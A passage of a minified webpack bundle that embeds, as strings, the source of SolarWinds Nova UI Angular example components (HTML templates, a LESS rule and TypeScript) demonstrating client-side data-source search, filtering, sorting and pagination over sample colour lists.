IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./data-filter-docs/data-filter-docs.example.component";\nexport * from "./data-filter-basic/data-filter-basic.example.component";\nexport * from "./data-filter-test/data-filter-test.component";\nexport * from "./data-filter-isolated/data-filter-isolated.example.component";\n'},52543:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="onSearch($event)"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},93927:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    PaginatorComponent,\n    SearchComponent,\n} from "@nova-ui/bits";\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan " },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan " },\n    { color: "dark-magenta" },\n    { color: "dark-black" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan " },\n    { color: "light-magenta" },\n    { color: "light-black" },\n];\n\ninterface ExampleItem {\n    color: string;\n}\n\n@Component({\n    selector: "nui-client-side-basic-data-source-example",\n    providers: [ClientSideDataSource],\n    templateUrl: "./client-side-basic.example.component.html",\n})\nexport class DataSourceClientSideBasicExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<ExampleItem>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(RANDOM_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.registerComponent({\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        });\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    this.changeDetection.detectChanges();\n                }\n            );\n        await this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public async onSearch(value: string): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async changePagination(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async applyFilters(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n}\n'},15199:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="onSearch($event)"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},97383:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    Injectable,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    PaginatorComponent,\n    SearchComponent,\n    SearchService,\n} from "@nova-ui/bits";\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan " },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan " },\n    { color: "dark-magenta" },\n    { color: "dark-black" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan " },\n    { color: "light-magenta" },\n    { color: "light-black" },\n];\n\ninterface ExampleItem {\n    color: string;\n}\n\n@Injectable()\nexport class ClientSideCustomSearchService extends SearchService {\n    protected filterPredicate(item: any, searchValue: any): boolean {\n        return item.toString().indexOf(searchValue.toString()) !== -1;\n    }\n}\n\n@Component({\n    selector: "nui-client-side-custom-search-example",\n    templateUrl: "./client-side-custom-search.example.component.html",\n    providers: [\n        ClientSideDataSource,\n        { provide: SearchService, useClass: ClientSideCustomSearchService },\n    ],\n})\nexport class DataSourceClientSideCustomSearchExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<ExampleItem>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(RANDOM_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    this.changeDetection.detectChanges();\n                }\n            );\n        await this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public async onSearch(value: string): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async changePagination(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async applyFilters(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n}\n'},15263:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n<div class="client-side-delayed-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                [value]="searchTerm"\n                (inputChange)="onSearch()"\n                (cancel)="onSearch()"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},59399:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subject, Subscription } from "rxjs";\nimport { debounceTime } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    PaginatorComponent,\n    SearchComponent,\n    SorterComponent,\n} from "@nova-ui/bits";\n\nconst INITIAL_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan" },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan" },\n    { color: "dark-magenta" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan" },\n    { color: "light-magenta" },\n];\n\n@Component({\n    selector: "nui-client-side-delayed-data-source-example",\n    providers: [ClientSideDataSource],\n    templateUrl: "./client-side-delayed.example.component.html",\n})\nexport class DataSourceClientSideDelayedExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n    public sorter = {\n        columns: ["color", "red", "green", "blue"],\n        sortedColumn: "color",\n        direction: "asc",\n    };\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    private delayActionSubject = new Subject<void>();\n    private outputsSubscription: Subscription;\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringSorter") filteringSorter: SorterComponent;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<any>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(INITIAL_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    this.changeDetection.detectChanges();\n                }\n            );\n        this.delayActionSubject.pipe(debounceTime(500)).subscribe(() => {\n            this.dataSourceService.applyFilters();\n        });\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public onSearch(): void {\n        this.delayActionSubject.next();\n    }\n\n    public async changePagination(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n}\n'},90775:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #listRepeatItemTemplate let-item="item">\n    <div>{{ item.color }}&nbsp;</div>\n    <div>{{ item.status }}</div>\n</ng-template>\n\n<ng-template #emptyListTemplate>\n    <div class="d-flex flex-column align-items-center">\n        <nui-image [isWatermark]="true" image="no-data-to-show"></nui-image>\n        <p class="nui-text-small">No data to show</p>\n    </div>\n</ng-template>\n\n<div>\n    <nui-panel [panelMode]="panelOptions.panelMode" id="collapsible-panel">\n        <div nuiPanelEmbeddedHeading>{{ panelOptions.heading }}</div>\n        <div nuiPanelEmbeddedBody>\n            <nui-expander\n                [open]="statusExpanderOptions.expanded"\n                [header]="statusExpanderOptions.header"\n                icon="orion-sitemaster"\n                class="mb-5"\n            >\n                <nui-checkbox-group\n                    id="nui-demo-checkbox-group-basic"\n                    name="cType"\n                    [values]="selectedColorTypes"\n                    (valuesChange)="onSelectedColorTypesChange($event)"\n                >\n                    <nui-checkbox\n                        *ngFor="let status of allStatuses; let i = index"\n                        [value]="status"\n                        [checked]="isColorTypeChecked(status)"\n                    >\n                        <div class="d-flex align-items-center">\n                            <nui-icon\n                                class="mr-2"\n                                [icon]="statusIcons[status].iconName"\n                            ></nui-icon>\n                            <span class="mr-2">{{ status }}</span>\n                            <span\n                                *ngIf="isGreaterThanZero(showStatus(status))"\n                                class="mr-2"\n                                >{{ showStatus(status) }}</span\n                            >\n                        </div>\n                    </nui-checkbox>\n                </nui-checkbox-group>\n            </nui-expander>\n            <nui-expander\n                [open]="colorExpanderOptions.expanded"\n                [header]="colorExpanderOptions.header"\n                icon="orion-sitemaster"\n                class="mb-5"\n            >\n                <nui-checkbox-group\n                    id="nui-demo-checkbox-group-basic"\n                    name="criteriaColor"\n                    [values]="selectedCriteriaColors"\n                    (valuesChange)="onSelectedCriteriaChange($event)"\n                >\n                    <nui-checkbox\n                        *ngFor="let color of allColors; let i = index"\n                        [value]="color"\n                        [checked]="isColorCriteriaChecked(color)"\n                    >\n                        <div class="d-flex align-items-center">\n                            <nui-icon\n                                class="mr-2"\n                                [icon]="colorIcons[color].iconName"\n                            ></nui-icon>\n                            <span class="mr-2">{{ color }}</span>\n                            <span\n                                *ngIf="isGreaterThanZero(showColor(color))"\n                                class="mr-2"\n                                >{{ showColor(color) }}</span\n                            >\n                        </div>\n                    </nui-checkbox>\n                </nui-checkbox-group>\n            </nui-expander>\n        </div>\n        <div class="push-down">\n            <div class="d-flex flex-row">\n                <div class="mb-3" [hidden]="!hasItems()">\n                    <nui-sorter\n                        [itemsSource]="sorterItems"\n                        [selectedItem]="sortBy"\n                        [sortDirection]="initialSortDirection"\n                        (sorterAction)="onSorterAction($event)"\n                        #filteringSorter\n                    >\n                    </nui-sorter>\n                </div>\n                <div class="ml-auto">\n                    <nui-search\n                        [value]="searchTerm"\n                        (search)="applyFilters()"\n                        #filteringSearch\n                    >\n                    </nui-search>\n                </div>\n            </div>\n            <div *ngIf="hasItems(); else emptyListTemplate">\n                <nui-repeat\n                    [itemsSource]="filteringState?.repeat?.itemsSource"\n                    [repeatItemTemplateRef]="listRepeatItemTemplate"\n                    paddingSize="normal"\n                    #filteringRepeat\n                >\n                </nui-repeat>\n            </div>\n            <div class="mt-3" [hidden]="!hasItems()">\n                <nui-paginator\n                    [page]="page"\n                    [total]="filteringState?.paginator?.total"\n                    (pagerAction)="applyFilters()"\n                    #filteringPaginator\n                >\n                </nui-paginator>\n            </div>\n        </div>\n    </nui-panel>\n</div>\n'},7427:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".push-down {\n    min-height: 550px;\n}\n"},23183:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    Inject,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport _get from "lodash/get";\nimport _isEmpty from "lodash/isEmpty";\nimport { Subscription } from "rxjs";\n\nimport {\n    DataSourceService,\n    IFilter,\n    IMenuItem,\n    IMultiFilterMetadata,\n    INovaFilteringOutputs,\n    ISorterChanges,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    RepeatComponent,\n    SearchComponent,\n    SorterComponent,\n    SorterDirection,\n} from "@nova-ui/bits";\n\ninterface ExampleItem {\n    color: string;\n    status: string;\n}\n\ninterface IconsOptions {\n    [key: string]: {\n        iconName: string;\n    };\n}\n\ninterface ExpanderOptions {\n    expanded: boolean;\n    header: string;\n}\n\ninterface PanelOptions {\n    panelMode: string;\n    heading: string;\n}\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue", status: "Critical" },\n    { color: "regular-green", status: "Warning" },\n    { color: "regular-yellow", status: "Up" },\n    { color: "regular-cyan ", status: "Critical" },\n    { color: "regular-magenta", status: "Warning" },\n    { color: "regular-black", status: "Up" },\n    { color: "regular-orange", status: "Up" },\n    { color: "regular-rose", status: "Up" },\n    { color: "regular-violet", status: "Up" },\n    { color: "regular-azure", status: "Critical" },\n    { color: "dark-blue", status: "Warning" },\n    { color: "dark-green", status: "Up" },\n    { color: "dark-yellow", status: "Critical" },\n    { color: "dark-cyan ", status: "Warning" },\n    { color: "dark-magenta", status: "Up" },\n    { color: "dark-black", status: "Critical" },\n    { color: "dark-orange", status: "Warning" },\n    { color: "dark-rose", status: "Up" },\n    { color: "dark-violet", status: "Critical" },\n    { color: "dark-azure", status: "Warning" },\n    { color: "light-blue", status: "Up" },\n    { color: "light-green", status: "Critical" },\n    { color: "light-yellow", status: "Warning" },\n    { color: "light-cyan", status: "Up" },\n    { color: "light-magenta", status: "Critical" },\n    { color: "light-black", status: "Warning" },\n    { color: "light-orange", status: "Up" },\n    { color: "light-rose", status: "Critical" },\n    { color: "light-violet", status: "Warning" },\n    { color: "light-azure", status: "Up" },\n];\n\n/**\n * @TODO Migrate LocalFilteringDataSource to ClientSideDataSource\n */\n@Component({\n    selector: "nui-client-side-filtering-data-source-example",\n    templateUrl: "./client-side-filtering.example.component.html",\n    styleUrls: ["./client-side-filtering.example.component.less"],\n    providers: [\n        {\n            provide: DataSourceService,\n            useClass: LocalFilteringDataSource,\n        },\n    ],\n})\nexport class DataSourceClientSideFilteringExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public panelOptions: PanelOptions = {\n        panelMode: "collapsible",\n        heading: "Filters",\n    };\n\n    public colorExpanderOptions: ExpanderOptions = {\n        expanded: true,\n        header: "Colors",\n    };\n\n    public statusExpanderOptions: ExpanderOptions = {\n        expanded: true,\n        header: "Statuses",\n    };\n\n    public statusIcons: IconsOptions = {\n        Critical: { iconName: "status_critical" },\n        Warning: { iconName: "status_warning" },\n        Up: { iconName: "status_up" },\n    };\n\n    public colorIcons: IconsOptions = {\n        azure: { iconName: "record" },\n        black: { iconName: "status_up" },\n        blue: { iconName: "signal-0" },\n        cyan: { iconName: "signal-0" },\n        green: { iconName: "signal-1" },\n        orange: { iconName: "signal-2" },\n        rose: { iconName: "signal-0" },\n        violet: { iconName: "signal-0" },\n        yellow: { iconName: "signal-0" },\n        brown: { iconName: "signal-0" },\n    };\n\n    public allStatuses: string[] = ["Warning", "Critical", "Up"];\n\n    public allColors: string[] = [\n        "azure",\n        "black",\n        "blue",\n        "cyan",\n        "green",\n        "orange",\n        "rose",\n        "violet",\n        "yellow",\n        "brown",\n    ];\n\n    public selectedColorTypes: string[] = ["Up"];\n\n    public selectedCriteriaColors: string[] = ["azure"];\n\n    public readonly sorterItems: IMenuItem[] = [\n        {\n            title: $localize`Color`,\n            value: "color",\n        },\n    ];\n\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.sorterItems[0].value;\n\n    // By convention this is the object that will contain results of filtering, it should contain the same keys as registered components\n    // We\'re using this object to bind to template items/paginator/filtering data\n    public filteringState: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        color: [], // This will contain objects like {}\n        status: [],\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n    public page: number = 1;\n    public searchTerm: string = "";\n    public chosenColors: string[] = [];\n    public chosenStatuses: string[] = [];\n\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringSorter") filteringSorter: SorterComponent;\n    @ViewChild("filteringRepeat") filteringRepeat: RepeatComponent;\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        @Inject(DataSourceService)\n        public dataSourceService: LocalFilteringDataSource<ExampleItem>\n    ) {\n        this.dataSourceService.setData(RANDOM_ARRAY);\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.chosenColors = [...this.selectedCriteriaColors];\n        this.chosenStatuses = [...this.selectedColorTypes];\n        this.dataSourceService.registerComponent({\n            ...this.registerComponents(),\n        });\n\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.filteringState = data;\n                    if (data && data.paginator && data.paginator.reset) {\n                        // This allows to go back to first page after filtering/search/sorting has changed\n                        this.filteringPaginator.goToPage(1);\n                    }\n                }\n            );\n\n        await this.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        if (this.outputsSubscription) {\n            this.outputsSubscription.unsubscribe();\n        }\n    }\n\n    private registerComponents = () => ({\n        // Here we\'re registering color and status filters\n        color: {\n            componentInstance: {\n                // mark this filter to be monitored by our datasource for any changes in order reset other filters(eg: pagination)\n                // before any new search is performed\n                detectFilterChanges: true,\n                getFilters: () =>\n                    <IFilter<string[], IMultiFilterMetadata>>{\n                        type: "string[]",\n                        value: this.chosenColors,\n                        metadata: {\n                            allCategories: this.allColors,\n                        },\n                    },\n            },\n        },\n        status: {\n            componentInstance: {\n                // mark this filter to be monitored by our datasource for any changes in order reset other filters(eg: pagination)\n                // before any new search is performed\n                detectFilterChanges: true,\n                getFilters: () =>\n                    <IFilter<string[], IMultiFilterMetadata>>{\n                        type: "string[]",\n                        value: this.chosenStatuses,\n                        metadata: {\n                            allCategories: this.allStatuses,\n                        },\n                    },\n            },\n        },\n        search: {\n            componentInstance: this.filteringSearch,\n        },\n        sorter: {\n            componentInstance: this.filteringSorter,\n        },\n        paginator: {\n            componentInstance: this.filteringPaginator,\n        },\n    });\n\n    public async applyFilters(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async onSorterAction(changes: ISorterChanges): Promise<void> {\n        this.sortBy = changes.newValue.sortBy;\n        await this.applyFilters();\n    }\n\n    public async onSelectedCriteriaChange($event: string[]): Promise<void> {\n        this.chosenColors = $event;\n        await this.applyFilters();\n    }\n\n    public async onSelectedColorTypesChange($event: string[]): Promise<void> {\n        this.chosenStatuses = $event;\n        await this.applyFilters();\n    }\n\n    public isColorCriteriaChecked(color: string): boolean {\n        return this.selectedCriteriaColors.indexOf(color) > -1;\n    }\n\n    public isColorTypeChecked(status: string): boolean {\n        return this.selectedColorTypes.indexOf(status) > -1;\n    }\n\n    public hasItems(): boolean {\n        return !_isEmpty(_get(this, "filteringState.repeat.itemsSource"));\n    }\n\n    public showStatus(status: string): string {\n        return this.filteringState.status\n            ? this.filteringState.status[status]\n            : this.filteringState.status;\n    }\n\n    public showColor(color: string): string {\n        return this.filteringState.color\n            ? this.filteringState.color[color]\n            : this.filteringState.color;\n    }\n\n    public isGreaterThanZero(amount: number): boolean {\n        return amount > 0;\n    }\n}\n'},75823:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-selector\n                (selectionChange)="onSelectorOutput($event)"\n                [checkboxStatus]="state.selector?.selectorState.checkboxStatus"\n                [items]="state.selector?.selectorState.selectorItems"\n            >\n            </nui-selector>\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="applyFilters()"\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                selectionMode="multi"\n                [selection]="state.repeat?.selectedItems"\n                (selectionChange)="onRepeatOutput($event)"\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [pageSize]="10"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="applyFilters()"\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},68055:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE 